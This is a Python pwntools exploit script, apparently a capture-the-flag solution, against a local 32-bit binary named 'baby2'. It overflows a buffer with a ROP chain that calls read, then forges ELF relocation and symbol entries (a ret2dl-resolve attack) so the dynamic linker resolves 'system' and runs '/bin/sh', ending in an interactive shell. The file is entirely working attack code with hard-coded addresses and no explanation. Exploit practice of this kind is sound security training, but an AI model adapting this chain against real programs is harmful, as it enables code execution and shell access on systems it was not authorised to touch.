#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

p = process('./baby2')
elf = ELF('./baby2')

buf = elf.symbols['useless'] # 0x804a040
read_plt = elf.plt['read']
read_got = elf.got['read']
start = elf.symbols['_start']
plt0 = 0x8048320

# readelf -a ./baby2 | grep .dynamic
#   [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4
dynamic = 0x08049f14
# readelf -a ./baby2 | grep .rel.plt
#   [10] .rel.plt          REL             080482d8 0002d8 000018 08  AI  5  24  4
relplt = 0x080482d8
# readelf -a ./baby2 | grep SYMTAB
#  0x00000006 (SYMTAB)                     0x80481d0
dynsym = 0x80481d0
# readelf -a ./baby2 | grep STRTAB
#  0x00000005 (STRTAB)                     0x8048240
dynstr = 0x8048240

pop3_ret = 0x08048509
ret = 0x080482fa

#gdb.attach(p, 'b *0x80484a7\nc')

def read(addr, size): # addr=>+12 ; size=>+16
	return p32(read_plt) + p32(pop3_ret) + p32(0) + p32(addr) + p32(size)

reloc_arg = buf - relplt
payload = cyclic(100)
payload = (
	read(buf, 0x100) + 
	p32(plt0) + 
	p32(reloc_arg) + 
	p32(0xdeadbeef) + 
	p32(buf + 40) # &"/bin/sh\x00"
).ljust(44, '\x00')
payload += '\x9C' # overflow ecx
p.send(payload)

pause()

padding_size = 16 - ((buf + 8 - dynsym) % 16) # 8
payload = ( # buf
	# Elf32_Rel
	p32(buf) + # r_offset
	p32(0x7 | (((buf + 8 + padding_size - dynsym) / 16) << 8)) + # r_info
	'A' * padding_size + # padding
	# Elf32_Sym
	p32(buf + 32 - dynstr) + # st_name
	p32(0) + # st_value
	p32(0) + # st_size
	p32(0x12) + # st_info
	# buf+32
	'system\x00\x00' + '/bin/sh\x00'
)
p.sendline(payload)

p.interactive()

